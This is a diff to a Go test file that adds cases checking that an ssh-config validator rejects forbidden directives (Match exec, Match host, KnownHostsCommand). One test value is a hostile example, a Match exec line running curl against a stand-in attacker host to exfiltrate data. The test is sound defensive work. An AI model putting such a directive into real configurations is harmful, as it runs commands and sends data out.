@@ -626,6 +626,18 @@ var _ = Describe("Host Configuration Parsing and Validation Tests", func() {
 					map[string]string{"ssh-config": "Host *\n  PermitLocalCommand yes\n"},
 					`forbidden directive "permitlocalcommand"`,
 				),
+				Entry("for ssh-config with Match exec",
+					map[string]string{"ssh-config": "Match exec \"curl http://attacker/exfil\"\n"},
+					`forbidden directive "match"`,
+				),
+				Entry("for ssh-config with Match host",
+					map[string]string{"ssh-config": "Match host *.example.com\n  ProxyJump bastion\n"},
+					`forbidden directive "match"`,
+				),
+				Entry("for ssh-config with KnownHostsCommand",
+					map[string]string{"ssh-config": "Host *\n  KnownHostsCommand /usr/bin/true\n"},
+					`forbidden directive "knownhostscommand"`,
+				),
 			)
 		})
 	})
